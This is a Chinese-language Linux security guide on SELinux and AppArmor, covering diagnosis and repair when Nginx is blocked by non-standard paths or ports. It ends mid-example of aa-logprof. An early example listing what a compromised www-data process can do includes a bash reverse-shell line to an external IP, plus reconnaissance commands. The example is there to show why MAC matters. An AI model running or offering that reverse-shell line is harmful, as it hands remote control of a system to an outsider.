---
title: "SELinux 與 AppArmor"
desc: "強制存取控制 MAC 的觀念、AppArmor 與 SELinux 的診斷與正確調整方式，含被擋到修復的完整流程"
aliases: [selinux, apparmor, mac]
tags: [群組/資訊安全, 安全/加固, 主題/存取控制]
category: 系統與網路防護
difficulty: 專家
status: 完成
distro: [ubuntu, rhel]
prerequisites: ["[[020-01-08-cmd-Linux-檔案權限與擁有者]]"]
updated: 2026-09-03
---

# SELinux 與 AppArmor

> [!abstract] 這篇你會學到
> - DAC（傳統 rwx）擋不住什麼，為什麼需要多一層 MAC
> - ★ 用「Nginx 被入侵」這個具體場景，看 DAC 與 MAC 下的差別
> - AppArmor（Ubuntu 主線）：profile 結構、`complain` 與 `enforce`、`aa-logprof` 產生規則
> - SELinux（RHEL 主場）：context、`restorecon`、布林值、`semanage port`、`audit2allow`
> - ★★★★★ 為什麼「先關掉 SELinux」是機關最常見也最貴的錯誤處置
> - 兩個最常遇到的實際場景：非標準網站根目錄、非標準服務埠，各給完整診斷到修復流程

## 這篇你會學到

| 主題 | 重要度 | 說明 |
| --- | --- | --- |
| DAC 的極限 | ★★★★ | 為什麼 `chmod 750` 保護不了被入侵的服務 |
| MAC 的核心想法 | ★★★★ | 「程式能做什麼」由政策決定，不由檔案擁有者決定 |
| AppArmor 操作 | ★★★★ | `aa-status`／`aa-complain`／`aa-enforce`／`aa-logprof` |
| SELinux 操作 | ★★★★★ | context、布林值、埠標籤、`audit2allow` |
| 不要關掉它 | ★★★★★ | 關掉的代價與正確替代做法 |
| 非標準路徑被擋 | ★★★★★ | 最常見場景 1，完整流程 |
| 非標準埠被擋 | ★★★★★ | 最常見場景 2，完整流程 |
| 錯誤修復的代價 | ★★★★★ | 示範「直接關掉」到底失去了什麼 |

## 前置知識

| 前置 | 對應篇章 |
| --- | --- |
| 傳統權限 rwx、擁有者與群組 | [[020-01-08-cmd-Linux-檔案權限與擁有者]] |
| 使用者與群組管理 | [[020-01-09-cmd-Linux-使用者與群組管理]] |
| systemd 服務啟停與看狀態 | [[020-01-17-cmd-Linux-systemd服務管理]] |
| 日誌系統與 journalctl | [[020-01-19-guide-Linux-日誌系統]] |
| Nginx 基本設定（本篇範例用它） | [[060-02-02-02-guide-Nginx-設定語法與虛擬主機]] |
| 主機防火牆（另一層防護） | [[090-02-02-guide-防火牆-ufw基礎與實務]] |

實驗環境建議準備兩台：一台 Ubuntu 24.04（AppArmor）、一台 Rocky 9（SELinux）。
環境準備看 [[020-01-02-guide-Linux-實驗環境準備與初次登入]]。

## 觀念說明

### DAC：傳統權限模型，以及它擋不住什麼 ★★★★

Linux 傳統的權限是 **DAC（Discretionary Access Control，自主存取控制）**：
「檔案的擁有者自行決定誰能存取」。判斷依據只有兩件事 ——
**發起動作的使用者是誰**、**檔案的 rwx 位元怎麼設**。

問題出在「使用者是誰」這個判斷太粗。看這個例子：

```bash
ps aux | grep nginx
```

```text
root      1201  0.0  0.1  55240  1832 ?  Ss  09:12  0:00 nginx: master process /usr/sbin/nginx
www-data  1202  0.0  0.4  55892  4520 ?  S   09:12  0:00 nginx: worker process
```

worker 以 `www-data` 執行。在 DAC 下，這個 worker **能做 `www-data` 能做的一切**：

```bash
# 這些都是 www-data 在 DAC 下合法的動作
cat /etc/passwd                    # 全域可讀
ls -l /home/                       # 看得到有哪些使用者
find / -perm -o+w -type d 2>/dev/null   # 找出所有人可寫的目錄
cat /var/backups/dump.sql          # 只要它是 644 或屬於 www-data
curl -s http://10.10.20.31:3306    # 對內網任意主機發連線
bash -i >& /dev/tcp/45.155.205.11/443 0>&1   # 反向 shell
```

> [!danger] ★★★★★ 關鍵認知
> 你把網站目錄 `chmod 750`、擁有者設成 `www-data` —— 這保護的是「別的使用者」。
> **但攻擊者透過 Nginx 的漏洞執行程式碼時，他就是 `www-data`。**
> DAC 對他而言不是障礙，是通行證。

### MAC：換一個問題來問 ★★★★

**MAC（Mandatory Access Control，強制存取控制）** 問的不是「你是誰」，
而是「**你是哪一支程式，這支程式被允許做什麼**」。

規則由系統管理員集中定義，**檔案擁有者無權放寬**（這就是 Mandatory 的意思）。
即使 root 執行的程序，只要政策沒允許，一樣被擋。

回到剛才的例子。有 MAC 的情況下，Nginx 的政策大概長這樣：

| 動作 | 政策允許嗎 |
| --- | --- |
| 讀 `/var/www/html/**` | ✅ 允許（這是它的工作） |
| 讀 `/etc/nginx/**` | ✅ 允許 |
| 寫 `/var/log/nginx/**` | ✅ 允許 |
| 綁定 tcp/80、tcp/443 | ✅ 允許 |
| 讀 `/etc/shadow` | ❌ 拒絕 |
| 讀 `/var/backups/dump.sql` | ❌ 拒絕 |
| 讀 `/home/**` | ❌ 拒絕 |
| 執行 `/bin/bash` | ❌ 拒絕（或降級到受限網域） |
| 對外主動建立 TCP 連線 | ❌ 拒絕（SELinux 預設的 `httpd_can_network_connect` 是 off） |

**攻擊者仍然是 `www-data`，但他被關在「Nginx 這支程式該有的能力」裡面。**
他讀不到資料庫備份、開不了反向 shell、也翻不了家目錄。

> [!note] ★★★★ 一句話總結兩者的關係
> DAC 決定「這個**使用者**可不可以」，MAC 決定「這個**程式**可不可以」。
> 兩個都要過才放行。MAC 只會**收窄**，不會放寬 DAC —— 
> 所以 MAC 開著的時候，DAC 該設的權限一樣要設好。

### 兩者的定位對照 ★★★★

| 面向 | AppArmor | SELinux |
| --- | --- | --- |
| 主要發行版 | ★★★★ Ubuntu／Debian／openSUSE 預設 | ★★★★ RHEL／Rocky／AlmaLinux／Fedora 預設 |
| 判斷依據 | **路徑**（path-based） | **標籤**（label-based，寫在 inode 的擴充屬性） |
| 設定檔位置 | `/etc/apparmor.d/` | `/etc/selinux/`、政策模組在 `semodule` 裡 |
| 學習曲線 | ★★ 較平緩，profile 像一份可讀的清單 | ★★★★ 較陡，要理解 type enforcement |
| 表達力 | 中（路徑、能力、網路、掛載） | ★★★★ 高（type、role、MLS/MCS、細到單一 syscall 類別） |
| 改路徑的影響 | 路徑一改，規則就對不上（要改 profile） | ★★★ 檔案搬家會帶著標籤走，但複製會拿到新目錄的預設標籤 |
| 預設涵蓋 | ★★ 只保護有 profile 的程式（其餘 unconfined） | ★★★★ targeted 政策保護所有主要 daemon，其餘走 `unconfined_t` |
| 診斷工具 | `aa-status`、`aa-logprof`、`aa-notify` | `sestatus`、`ausearch`、`audit2allow`、`sealert` |
| 「暫時放行」模式 | `complain`（單一 profile） | `permissive`（全域或單一 domain） |
| 典型日誌關鍵字 | `apparmor="DENIED"` | `avc:  denied` |

> [!tip] ★★★ 不必二選一，但也不要同時裝
> 兩者都是 Linux Security Module（LSM），**同一時間只會有一個 major LSM 生效**。
> 在 Ubuntu 上就用 AppArmor，在 RHEL 系上就用 SELinux，
> 不要試圖在 Ubuntu 上硬裝 SELinux（可以做但沒有完整的政策維護，會讓你痛苦很久）。

### 這是「縱深防禦」的一層，不是唯一一層 ★★★

MAC 的價值在於**假設前面的防線已經失守**：Web 應用有漏洞、程式被 RCE、
攻擊者已經在 `www-data` 的身分裡了。這時 MAC 決定他能走多遠。

它擋不了什麼：擋不了 SQL injection 讀走資料庫內容（那是應用層的事，
見 [[090-03-02-guide-應用安全-應用層安全]]）、
擋不了弱密碼被猜中、擋不了你自己把規則寫得太寬。

它值得的地方在於：**成本低（大多數情況下是「不要關掉它」），
但把「一個 Web 漏洞」和「整台機器淪陷」之間隔開了。**
整體防禦分層見 [[090-05-01-guide-資安設備-資安全景圖與縱深防禦]]。

## 安裝或基礎操作

### AppArmor（Ubuntu／Debian 主線）

Ubuntu 預設就裝好也啟用了，但管理工具要另外裝：

```bash
sudo apt install -y apparmor-utils apparmor-profiles
```

**看目前狀態** ★★★★：

```bash
sudo aa-status
```

```text
apparmor module is loaded.
41 profiles are loaded.
33 profiles are in enforce mode.
   /snap/snapd/21759/usr/lib/snapd/snap-confine
   /usr/bin/man
   /usr/lib/NetworkManager/nm-dhcp-client.action
   /usr/sbin/chronyd
   /usr/sbin/cups-browsed
   ...
8 profiles are in complain mode.
   /usr/sbin/nginx
   ...
0 profiles are in kill mode.
0 profiles are in unconfined mode.
14 processes have profiles defined.
12 processes are in enforce mode.
   /usr/sbin/chronyd (742)
   /usr/sbin/cupsd (881)
   ...
2 processes are in complain mode.
0 processes are unconfined but have a profile defined.
```

三個要看的數字：載入幾個 profile、幾個在 enforce、**幾個 process 真的被限制住**。
最後一行 `0 processes are unconfined but have a profile defined` 很重要 ——
不是 0 代表某個服務在 profile 載入前就啟動了，要重啟該服務。★★★

**檢查有哪些網路服務沒有 profile** ★★★：

```bash
sudo aa-unconfined
```

```text
742 /usr/sbin/chronyd confined by '/usr/sbin/chronyd (enforce)'
881 /usr/sbin/cupsd not confined
1201 /usr/sbin/nginx confined by '/usr/sbin/nginx (complain)'
1503 /usr/sbin/sshd not confined
```

`not confined` 的那些就是 AppArmor 完全沒管的程式。

**三種模式與切換** ★★★★：

| 模式 | 行為 | 指令 |
| --- | --- | --- |
| `enforce` | 違規動作被**擋下**並記錄 | `sudo aa-enforce /usr/sbin/nginx` |
| `complain` | 違規動作**放行**但記錄（learning mode） | `sudo aa-complain /usr/sbin/nginx` |
| `disable` | 不載入這個 profile | `sudo aa-disable /usr/sbin/nginx` |

```bash
sudo aa-complain /etc/apparmor.d/usr.sbin.nginx
```

```text
Setting /etc/apparmor.d/usr.sbin.nginx to complain mode.
```

> [!tip] ★★★★ 導入新 profile 的標準節奏
> **complain → 跑一週真實流量 → `aa-logprof` 收集 → 檢視每一條 → enforce**。
> 直接 enforce 一個沒驗證過的 profile，等於幫自己安排一次半夜的服務中斷。

**Profile 的結構** ★★★★：

```text
abi <abi/4.0>,
include <tunables/global>

/usr/sbin/nginx flags=(attach_disconnected) {
  include <abstractions/base>
  include <abstractions/nis>
  include <abstractions/openssl>

  capability dac_override,
  capability net_bind_service,
  capability setgid,
  capability setuid,

  network inet stream,
  network inet6 stream,

  /usr/sbin/nginx mr,
  /etc/nginx/** r,
  /etc/ssl/certs/** r,
  /var/log/nginx/*.log w,
  /var/www/** r,
  /run/nginx.pid rw,

  # 本機自訂規則放這裡，套件更新不會蓋掉
  include if exists <local/usr.sbin.nginx>
}
```

檔案權限字母（★★★★ 最常用的幾個）：

| 字母 | 意義 |
| --- | --- |
| `r` | 讀 |
| `w` | 寫（含建立與刪除） |
| `a` | 只能附加（append），不能覆寫 |
| `m` | 可以被 `mmap` 成可執行 |
| `k` | 可以上檔案鎖 |
| `l` | 可以建立連結 |
| `ix` | 執行，**沿用目前 profile**（inherit） |
| `px` | 執行，**切換到目標程式自己的 profile**；找不到就拒絕 |
| `Px` | 同 `px`，但會清理環境變數（比較安全） |
| `cx` | 執行，切到本 profile 內定義的子 profile |
| `ux` | ★★★★ 執行且**完全不受限**（unconfined）—— 盡量不要用 |

路徑萬用字元：`*` 不跨目錄、`**` 跨目錄、`?` 單一字元、`{a,b}` 擇一。
`owner /home/*/.cache/** rw,` 的 `owner` 表示「只有檔案擁有者身分時才允許」。

**改完 profile 一定要重新載入** ★★★★：

```bash
sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx
sudo aa-status | grep nginx
```

```text
   /usr/sbin/nginx
   /usr/sbin/nginx (1201) 
```

**看被擋了什麼** ★★★★★：

```bash
sudo journalctl -k --since "10 min ago" | grep apparmor
```

```text
Sep 03 15:22:41 web01 kernel: audit: type=1400 audit(1756883, ...): apparmor="DENIED" operation="open" class="file" profile="/usr/sbin/nginx" name="/data/www/index.html" pid=1202 comm="nginx" requested_mask="r" denied_mask="r" fsuid=33 ouid=0
```

一行裡面全部的資訊都在：**哪個 profile**（`profile=`）、
**什麼動作**（`operation=`）、**對什麼**（`name=`）、
**要什麼權限**（`requested_mask=`）、**被拒絕什麼**（`denied_mask=`）。

裝了 auditd 的話同樣的紀錄會進 `/var/log/audit/audit.log`：

```bash
sudo ausearch -m AVC,USER_AVC -ts recent -i | grep -i apparmor
```

> [!info]- Rocky / AlmaLinux（RHEL 系）對照
> RHEL 系不用 AppArmor，直接看下一節的 SELinux。
> 唯一相關的是：RHEL 系上完全沒有 `aa-*` 指令，
> 看到教學叫你跑 `aa-status` 卻回 `command not found`，代表那份教學是給 Ubuntu 的。

### SELinux（RHEL 系主場，Ubuntu 上通常不啟用）

> [!note] ★★★ 這一節不摺疊
> SELinux 是 RHEL／Rocky／AlmaLinux 的主場，機關環境裡（尤其是跑商用軟體的機器）
> 遇到的機率非常高，而且它是「服務起不來」的頭號嫌犯。
> 所以這一節寫得和 AppArmor 一樣完整，不放進摺疊區塊。

**看目前狀態** ★★★★★：

```bash
sestatus
```

```text
SELinux status:                 enabled
SELinuxfs mount:                /sys/fs/selinux
SELinux root directory:         /etc/selinux
Loaded policy name:             targeted
Current mode:                   enforcing
Mode from config file:          enforcing
Policy MLS status:              enabled
Policy deny_unknown status:     allowed
Memory protection checking:     actual (secure)
Max kernel policy version:      33
```

```bash
getenforce
```

```text
Enforcing
```

三種模式：

| 模式 | 行為 | 重要度 |
| --- | --- | --- |
| `Enforcing` | 違規被擋下並記錄 | ★★★★★ 正式環境唯一正確答案 |
| `Permissive` | 違規放行但記錄 | ★★★★ 診斷用的暫時狀態 |
| `Disabled` | 完全不載入政策，**連日誌都沒有** | ★★★★★ 不要 |

```bash
sudo setenforce 0      # 切到 Permissive（重開機後恢復）
sudo setenforce 1      # 切回 Enforcing
```

> [!danger] ★★★★★ `setenforce 0` 是診斷工具，不是解法
> `setenforce 0` 的正當用途只有一個：**確認「是不是 SELinux 造成的」**。
> 切成 permissive 後問題消失 → 確定是 SELinux → **馬上切回 enforcing**，
> 然後去讀 AVC 紀錄找出正確的修法。
>
> 現場最常見的錯誤處置是：切成 permissive 後服務好了，
> 於是把 `/etc/selinux/config` 改成 `SELINUX=disabled` 收工。
> 這等於為了一個檔案標籤問題，把整台機器的第二層防線永久拆掉。

**永久設定在 `/etc/selinux/config`**：

```ini
# 此檔控制系統上 SELinux 的狀態
#     enforcing  - 強制執行 SELinux 安全政策
#     permissive - 只印出警告不強制執行
#     disabled   - 不載入 SELinux 政策
SELINUX=enforcing
# SELINUXTYPE 可以是：targeted / minimum / mls
SELINUXTYPE=targeted
```

> [!danger] ★★★★★ 從 disabled 切回 enforcing 一定要重新標記
> 系統在 `disabled` 期間建立或修改的檔案**沒有 SELinux 標籤**。
> 直接改成 `enforcing` 重開機，會有大量檔案標籤不對，
> 結果是**開不起來或一堆服務失敗**。正確做法：
> ```bash
> sudo sed -i 's/^SELINUX=disabled/SELINUX=permissive/' /etc/selinux/config
> sudo touch /.autorelabel
> sudo reboot          # 開機時全碟重新標記，機器大時可能要跑很久
> # 確認沒有大量 AVC 之後
> sudo setenforce 1
> sudo sed -i 's/^SELINUX=permissive/SELINUX=enforcing/' /etc/selinux/config
> ```
> 先過 permissive 觀察一輪再切 enforcing，是把風險降到最低的順序。

**安裝管理工具** ★★★★（RHEL 8／9 上 `semanage` 不是預設安裝的）：

```bash
sudo dnf install -y policycoreutils-python-utils setroubleshoot-server setools-console
```

| 套件 | 提供什麼 |
| --- | --- |
| `policycoreutils-python-utils` | ★★★★★ `semanage`、`audit2allow`、`audit2why` |
| `setroubleshoot-server` | `sealert`，把 AVC 翻成人話並給建議 |
| `setools-console` | `sesearch`、`seinfo`，查政策內容 |

**Context（安全上下文）** ★★★★★ —— SELinux 的核心：

```bash
ls -Z /var/www/html/
```

```text
unconfined_u:object_r:httpd_sys_content_t:s0 index.html
```

```bash
ps -eZ | grep nginx
```

```text
system_u:system_r:httpd_t:s0    1201 ?  00:00:00 nginx
```

格式是 `使用者:角色:型別:等級`，**日常維運 99% 只需要看第三段「型別（type）」**。

規則簡化成一句話：**`httpd_t` 這個 domain 可以讀 `httpd_sys_content_t` 這個 type 的檔案。**
標籤對不上就被擋，跟 rwx 完全無關。

常見的 httpd 相關型別（Nginx 在 RHEL 上也是跑在 `httpd_t`）★★★★：

| 型別 | 用途 |
| --- | --- |
| `httpd_sys_content_t` | 網站靜態內容（唯讀） |
| `httpd_sys_rw_content_t` | 需要 Web 程式寫入的目錄（上傳區、快取） |
| `httpd_sys_script_exec_t` | CGI／可執行的 script |
| `httpd_config_t` | `/etc/nginx`、`/etc/httpd` 設定檔 |
| `httpd_log_t` | `/var/log/nginx`、`/var/log/httpd` |
| `httpd_var_run_t` | PID 檔與 socket |
| `default_t` | ★★★★ 沒有規則涵蓋到的目錄拿到的預設標籤 —— 看到它通常就是問題所在 |

**修正標籤的兩個指令，差別非常重要** ★★★★★：

```bash
# chcon：暫時改，重新標記或 restorecon 之後會被還原
sudo chcon -t httpd_sys_content_t /data/www/index.html

# semanage fcontext + restorecon：改「規則」再套用，是永久的
sudo semanage fcontext -a -t httpd_sys_content_t "/data/www(/.*)?"
sudo restorecon -Rv /data/www
```

> [!warning] ★★★★★ 不要只用 `chcon`
> `chcon` 改的是「這個檔案現在的標籤」，沒有改「這個路徑應該是什麼標籤」的規則。
> 下一次 `restorecon`、系統重新標記、或用 `cp` 覆蓋檔案，標籤就跑掉了，
> 服務會在你完全沒改任何東西的情況下突然壞掉，而且極難查。
> **正解永遠是 `semanage fcontext -a` 加 `restorecon`。**

**布林值（boolean）** ★★★★ —— 政策裡預先寫好的開關：

```bash
getsebool -a | grep httpd | head -15
```

```text
httpd_anon_write --> off
httpd_builtin_scripting --> on
httpd_can_network_connect --> off
httpd_can_network_connect_db --> off
httpd_can_sendmail --> off
httpd_enable_cgi --> on
httpd_enable_homedirs --> off
httpd_execmem --> off
httpd_read_user_content --> off
httpd_use_cifs --> off
httpd_use_nfs --> off
httpd_unified --> off
...
```

```bash
# -P 表示 persistent，寫入政策，重開機後仍生效
sudo setsebool -P httpd_can_network_connect on
getsebool httpd_can_network_connect
```

```text
httpd_can_network_connect --> on
```

> [!note] ★★★★★ `httpd_can_network_connect` 是最常需要開的一個
> 只要 Nginx／Apache 要做**反向代理**（`proxy_pass` 到後端 app、連 PHP-FPM 走 TCP、
> 連遠端 API），就需要它。沒開的症狀是 502，錯誤日誌寫
> `connect() to 127.0.0.1:9000 failed (13: Permission denied) while connecting to upstream`。
> ★★★ 這個 `13: Permission denied` 幾乎可以直接判定是 SELinux。
> 反向代理設定見 [[060-02-02-04-guide-Nginx-反向代理與負載平衡]]。
>
> 只連本機資料庫的話，用範圍更小的 `httpd_can_network_connect_db` 比較好。

**查布林值的用途**：

```bash
sudo semanage boolean -l | grep httpd_can_network_connect
```

```text
httpd_can_network_connect      (off  ,  off)  Allow httpd to can network connect
```

**埠標籤** ★★★★★ —— 讓服務可以聽非標準埠：

```bash
sudo semanage port -l | grep -E '^http_port_t|^ssh_port_t'
```

```text
http_port_t                    tcp      80, 81, 443, 488, 8008, 8009, 8443, 9000
ssh_port_t                     tcp      22
```

```bash
# 讓 httpd/nginx 可以聽 8081
sudo semanage port -a -t http_port_t -p tcp 8081
# 若該埠已經被別的型別佔用，用 -m 修改而不是 -a 新增
sudo semanage port -m -t http_port_t -p tcp 8081
# 刪除
sudo semanage port -d -t http_port_t -p tcp 8081
```

**讀懂拒絕紀錄** ★★★★★：

```bash
sudo ausearch -m AVC -ts recent
```

```text
time->Wed Sep  3 15:41:07 2026
type=AVC msg=audit(1756884067.412:238): avc:  denied  { read } for  pid=1202 comm="nginx" name="index.html" dev="dm-0" ino=262151 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:default_t:s0 tclass=file permissive=0
```

逐段讀：

| 欄位 | 值 | 意思 |
| --- | --- | --- |
| `denied { read }` | read | 被拒絕的動作是「讀」 |
| `comm="nginx"` | nginx | 誰要做這件事 |
| `name="index.html"` | index.html | 對什麼做 |
| `scontext` | `httpd_t` | ★★★★ 來源 domain（程式的身分） |
| `tcontext` | `default_t` | ★★★★★ 目標 type —— **這裡是 `default_t` 就代表標籤沒設對** |
| `tclass=file` | file | 目標是一個一般檔案 |
| `permissive=0` | 0 | 目前是 enforcing，動作真的被擋了 |

**用 `audit2why` 得到人話解釋** ★★★★：

```bash
sudo ausearch -m AVC -ts recent | audit2why
```

```text
type=AVC msg=audit(1756884067.412:238): avc:  denied  { read } for  pid=1202 comm="nginx" name="index.html" ...

	Was caused by:
	Missing type enforcement (TE) allow rule.

	You can use audit2allow to generate a loadable module to allow this access.
```

**用 `audit2allow` 產生政策模組** ★★★★（★★★★★ 用之前先看下面的警告）：

```bash
sudo ausearch -m AVC -ts recent -c nginx | audit2allow -M nginx-local
```

```text
******************** IMPORTANT ***********************
To make this policy package active, execute:

semodule -i nginx-local.pp
```

**★★★★★ 先讀產生出來的 `.te` 檔再決定要不要載入**：

```bash
cat nginx-local.te
```

```text
module nginx-local 1.0;

require {
	type httpd_t;
	type default_t;
	class file { open read getattr };
}

#============= httpd_t ==============
allow httpd_t default_t:file { open read getattr };
```

> [!danger] ★★★★★ `audit2allow` 是最容易被誤用的工具
> 上面這條規則的意思是「**允許 httpd_t 讀取系統上所有 `default_t` 的檔案**」。
> `default_t` 是一大堆沒被明確規範的目錄的預設標籤 ——
> 這一條下去，等於把 Nginx 對半個檔案系統的讀取權限打開，
> 保護力跟關掉 SELinux 差不了多少。
>
> **`audit2allow` 的正確用法是「最後手段」**，順序應該是：
> 1. 標籤錯了嗎？→ `semanage fcontext` + `restorecon`（★★★★★ 八成的問題在這）
> 2. 有現成的布林值嗎？→ `setsebool -P`（★★★★ 大部分剩下的問題在這）
> 3. 是埠號問題嗎？→ `semanage port -a`（★★★★）
> 4. 以上都不是，而且你**看得懂**產生的規則 → 才用 `audit2allow`
>
> 看到 `tcontext` 是 `default_t`，答案幾乎一定是第 1 項，不是 `audit2allow`。

**`sealert`：把 AVC 翻成建議** ★★★：

```bash
sudo sealert -a /var/log/audit/audit.log | head -30
```

```text
SELinux is preventing /usr/sbin/nginx from read access on the file index.html.

*****  Plugin restorecon (99.5 confidence) suggests   ************************

If you want to fix the label.
/data/www/index.html default label should be httpd_sys_content_t.
Then you can run restorecon. The access attempt may have been stopped due to
insufficient permissions to access a parent directory in which case try to
change the following command accordingly.
Do
# /sbin/restorecon -v /data/www/index.html
```

> [!tip] ★★★ `sealert` 的建議要看 confidence
> 高 confidence（>90）的建議通常可以照做。
> 低 confidence 的建議常常是「產生一個自訂模組」—— 那就回到上面的四步順序自己判斷。
> ★★ `sealert` 需要 `setroubleshoot-server`，正式環境有些人不裝（它有點吃資源），
> 那就用 `ausearch` + 四步順序手動判斷。

## 進階應用

### 場景一：Nginx 要讀非標準路徑的網站根目錄 ★★★★★

這是**最常見的第一名**。原因很單純：預設路徑（`/var/www/html`、`/usr/share/nginx/html`）
有現成的標籤規則／profile 規則，換到 `/data/www`、`/opt/app/public`、`/srv/web` 就沒有了。

**症狀**：Nginx 起得來、設定檔沒錯、`ls -l` 看權限也對，但瀏覽器 403。

#### SELinux 版：診斷到修復

```bash
# ① 確認是不是 SELinux（診斷用，馬上要切回來）
sudo setenforce 0
curl -s -o /dev/null -w '%{http_code}\n' http://localhost/
```

```text
200
```

```bash
sudo setenforce 1        # ★★★★★ 立刻切回來
curl -s -o /dev/null -w '%{http_code}\n' http://localhost/
```

```text
403
```

確定了。

```bash
# ② 看 AVC
sudo ausearch -m AVC -ts recent -c nginx -i | tail -5
```

```text
type=AVC msg=audit(09/03/2026 15:41:07.412:238) : avc:  denied  { read } for  pid=1202 comm=nginx name=index.html dev="dm-0" ino=262151 scontext=system_u:system_r:httpd_t:s0 tcontext=unconfined_u:object_r:default_t:s0 tclass=file permissive=0
```

```bash
# ③ 看實際標籤，和正常路徑對照
ls -Zd /data/www /var/www/html
```

```text
unconfined_u:object_r:default_t:s0        /data/www
system_u:object_r:httpd_sys_content_t:s0  /var/www/html
```

`default_t` vs `httpd_sys_content_t` —— 問題確認。

```bash
# ④ 正確修復：加規則 + 套用
sudo semanage fcontext -a -t httpd_sys_content_t "/data/www(/.*)?"
sudo restorecon -Rv /data/www
```

```text
Relabeled /data/www from unconfined_u:object_r:default_t:s0 to unconfined_u:object_r:httpd_sys_content_t:s0
Relabeled /data/www/index.html from unconfined_u:object_r:default_t:s0 to unconfined_u:object_r:httpd_sys_content_t:s0
```

```bash
# ⑤ 驗證
ls -Z /data/www/
curl -s -o /dev/null -w '%{http_code}\n' http://localhost/
```

```text
unconfined_u:object_r:httpd_sys_content_t:s0 index.html
200
```

```bash
# ⑥ 確認規則有寫進政策（重開機／重新標記後仍然正確）
sudo semanage fcontext -l | grep '/data/www'
```

```text
/data/www(/.*)?    all files    system_u:object_r:httpd_sys_content_t:s0
```

★★★★ 正規表示式 `(/.*)?` 的意思是「這個目錄本身，以及底下所有東西」。
少寫這一段只會標到目錄本身，裡面的檔案還是錯的。

★★★★ 如果有需要 Web 程式**寫入**的子目錄（上傳區），要另外給 rw 型別：

```bash
sudo semanage fcontext -a -t httpd_sys_rw_content_t "/data/www/uploads(/.*)?"
sudo restorecon -Rv /data/www/uploads
```

#### AppArmor 版：診斷到修復

```bash
# ① 看 kernel 日誌
sudo journalctl -k --since "5 min ago" | grep DENIED
```

```text
Sep 03 15:52:11 web01 kernel: audit: type=1400 audit(...): apparmor="DENIED" operation="open" class="file" profile="/usr/sbin/nginx" name="/data/www/index.html" pid=1202 comm="nginx" requested_mask="r" denied_mask="r" fsuid=33 ouid=0
```

```bash
# ② 在 local 覆寫檔加規則（★★★★ 不要直接改主 profile，套件更新會蓋掉）
sudo mkdir -p /etc/apparmor.d/local
sudo tee -a /etc/apparmor.d/local/usr.sbin.nginx >/dev/null <<'EOF'
  /data/www/ r,
  /data/www/** r,
EOF
```

```bash
# ③ 重新載入並驗證
sudo apparmor_parser -r /etc/apparmor.d/usr.sbin.nginx
curl -s -o /dev/null -w '%{http_code}\n' http://localhost/
```

```text
200
```

★★★★ 注意 `/data/www/ r,` 與 `/data/www/** r,` **兩條都要**：
前者允許讀目錄本身（列目錄、`stat`），後者允許讀底下的檔案。
只寫後者的話某些操作仍會被擋。

★★★ 需要寫入的上傳目錄：

```text
  /data/www/uploads/** rw,
  /data/www/uploads/ rw,
```

### 場景二：服務要聽非標準埠 ★★★★★

**症狀**：改了 `listen 8081;` 之後 `systemctl restart nginx` 失敗。

#### SELinux 版

```bash
sudo systemctl status nginx --no-pager -l | tail -8
```

```text
nginx[3410]: nginx: [emerg] bind() to 0.0.0.0:8081 failed (13: Permission denied)
nginx[3410]: nginx: configuration file /etc/nginx/nginx.conf test failed
systemd[1]: nginx.service: Control process exited, code=exited, status=1/FAILURE
```

`13: Permission denied` 在 root 執行的情況下出現 —— ★★★★★ 這是 SELinux 的典型指紋。

```bash
sudo ausearch -m AVC -ts recent -c nginx -i | tail -3
```

```text
type=AVC msg=audit(09/03/2026 16:02:33.881:301) : avc:  denied  { name_bind } for  pid=3410 comm=nginx src=8081 scontext=system_u:system_r:httpd_t:s0 tcontext=system_u:object_r:unreserved_port_t:s0 tclass=tcp_socket permissive=0
```

`name_bind` ＋ `tclass=tcp_socket` → 埠標籤問題，不是檔案問題。

```bash
# 先看這個埠現在屬於哪個型別
sudo semanage port -l | grep -w 8081
```

（沒有輸出 = 沒有被明確指派，落在 `unreserved_port_t`）

```bash
sudo semanage port -a -t http_port_t -p tcp 8081
sudo semanage port -l | grep '^http_port_t'
```

```text
http_port_t                    tcp      8081, 80, 81, 443, 488, 8008, 8009, 8443, 9000
```

```bash
sudo systemctl restart nginx
sudo ss -lntp | grep 8081
```

```text
LISTEN 0  511  0.0.0.0:8081  0.0.0.0:*  users:(("nginx",pid=3455,fd=7),...)
```

> [!warning] ★★★★ 埠已經屬於別的型別時要用 `-m`
> 例如 8080 預設就屬於 `http_cache_port_t`。這時 `-a` 會報：
> ```text
> ValueError: Port tcp/8080 already defined
> ```
> 改用 `sudo semanage port -m -t http_port_t -p tcp 8080`。
> ★★★ 但先想清楚：改動一個已被定義的埠會影響原本使用它的服務。

#### AppArmor 版

AppArmor 的網路規則粒度比 SELinux 粗：預設的 `network inet stream,` 已經允許
「建立 TCP socket」，**沒有針對埠號的規則**，所以換埠號通常不會被 AppArmor 擋。

```bash
sudo journalctl -k --since "5 min ago" | grep DENIED
```

（無輸出 = AppArmor 沒有擋）

★★★ 這時 Ubuntu 上 `bind() failed (13: Permission denied)` 的原因通常是別的：

| 可能原因 | 檢查方式 |
| --- | --- |
| 埠 < 1024 但沒有 `CAP_NET_BIND_SERVICE` | `systemctl cat nginx \| grep -i capab` |
| 埠已被別的程序佔用（訊息會是 `Address already in use`） | `sudo ss -lntp \| grep <埠>` |
| systemd 的 `RestrictAddressFamilies` 之類的沙箱設定 | `systemd-analyze security nginx.service` |

> [!warning] 未實機驗證
> AppArmor 較新的版本支援更細的網路規則語法
> （例如 `network inet stream ip=... port=...` 形式的條件），
> 但可用性依 kernel 與 apparmor 使用者空間版本而異，
> Ubuntu 24.04 的內建 profile 也還沒普遍使用這種寫法。
> 若你需要用 AppArmor 做埠級管控，請先在測試機用
> `apparmor_parser -Q` 驗證語法是否被接受，不要直接套到正式環境。
> 埠級的管控用防火牆做比較實際，見 [[090-02-02-guide-防火牆-ufw基礎與實務]]。

### 用 `aa-logprof` 從 complain 日誌產生規則 ★★★★

這是 AppArmor 最實用的功能：讓程式在 `complain` 模式下跑一段時間，
再把「它實際做過但 profile 沒允許」的事情整理出來，逐條問你要不要放行。

```bash
sudo aa-complain /etc/apparmor.d/usr.sbin.nginx
sudo systemctl restart nginx
# ★★★★ 讓真實流量跑一段時間（建議至少一週，要涵蓋 logrotate、備份、憑證更新）
sudo aa-logprof
```

互動介面大致長這樣：

```text
Reading log entries from /var/log/syslog.
Updating AppArmor profiles in /etc/apparmor.d.

Profile:  /usr/sbin/nginx
Path:     /data/www/index.html
New Mode: owner r
Severity: 4

 [1 - #include <abstractions/web-data>]
  2 - owner /data/www/index.html r,
